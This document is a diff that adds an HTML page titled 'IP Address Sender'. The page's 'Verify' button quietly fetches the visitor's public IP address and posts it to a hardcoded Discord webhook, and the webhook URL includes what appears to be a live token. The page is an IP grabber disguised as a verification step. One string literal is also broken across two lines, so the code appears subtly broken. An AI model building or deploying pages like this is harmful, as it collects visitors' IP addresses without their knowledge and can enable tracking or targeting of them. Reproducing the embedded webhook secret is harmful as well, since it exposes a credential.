@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Address Sender</title>
+</head>
+<body>
+    <h1>IP Address Sender</h1>
+
+    <button onclick="sendIPAddress()">Verify</button>
+
+    <script>
+        function getIPAddress() {
+            return new Promise((resolve) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open("GET", "https://api.ipify.org?format=json");
+                xhr.onload = () => {
+                    if (xhr.status === 200) {
+                        const data = JSON.parse(xhr.responseText);
+                        resolve(data.ip);
+                    } else {
+                        console.error("Error fetching IP address:", xhr.status);
+                    }
+                };
+                xhr.send();
+            });
+        }
+
+        async function sendIPAddress() {
+            try {
+                const ipAddress = await getIPAddress();
+                const webhookURL = "https://discord.com/api/webhooks/1292527826595086470/9anYAkKxcrDIo-iV80NjKFdxfZPdHVUvhVahjGuMTwt_eLH3Us_IVh22ASsxE--Ugmb4"; // Replace with your actual webhook URL
+
+                const data = {
+                    "content": `IP Address: ${ipAddress}`
+                };
+
+                const response = await fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    console.log("IP   
+ address sent successfully!");
+                } else {
+                    console.error("Error sending IP address:", response.status);
+                }
+            } catch (error) {
+                console.error("Error:", error);
+            }
+        }
+    </script>
+</body>
+</html>
